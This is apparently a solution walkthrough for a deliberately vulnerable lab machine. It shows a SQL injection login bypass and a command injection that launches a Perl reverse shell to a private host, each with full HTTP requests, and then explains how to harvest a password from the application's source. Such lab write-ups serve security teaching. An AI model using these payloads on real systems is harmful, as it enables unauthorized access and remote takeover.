SQL Injection
==================
There is a SQL injection in the logon form. The folowing basic
injection should grant access when used as a password " ' or ''=' "
and either the username psimon or agarfunkel.

```
POST /index.pl HTTP/1.1
Host: 192.168.213.130
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.213.130/index.pl
Connection: keep-alive
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 103

username=psimon&password=%27+or+%27%27%3D%27&login=Login&csrfToken=61E4B652-A065-11E5-8B5C-BED7AF43658F
```

Command Injection
==================
There is a command injection in the "profile" paramater. It is used in a
`` expresseion to ls the media directory. A basic perl reverse shell should
be able to be launched using Burp and an authenticated "peek" request.

perl -e 'use Socket;$i="192.168.213.1";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
*Hint*
Make sure to URL encode the payload...

```
POST /index.pl HTTP/1.1
Host: 192.168.213.130
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.213.130/index.pl
Cookie: SESID=61972a1aaf96d44be89cc28250e99e26
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 297

peekAt=agarfunkel| perl+-e+'use+Socket%3b$i%3d"192.168.213.1"%3b$p%3d8888%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">%26S")%3bopen(STDOUT,">%26S")%3bopen(STDERR,">%26S")%3bexec("/bin/sh+-i")%3b}%3b'
 |echo &csrfToken=03054730-A067-11E5-9A29-D12593CF92DC
```

Lateral Movement
==================
Once the reverse shell is poped you can read the index.pl file in the /var/www/html
directory. Hopefully the attacker picked up on the clues in the debug messages and
looks at index.pl's source and finds Paul's password. This should allow the attacker
to log in to paul's account.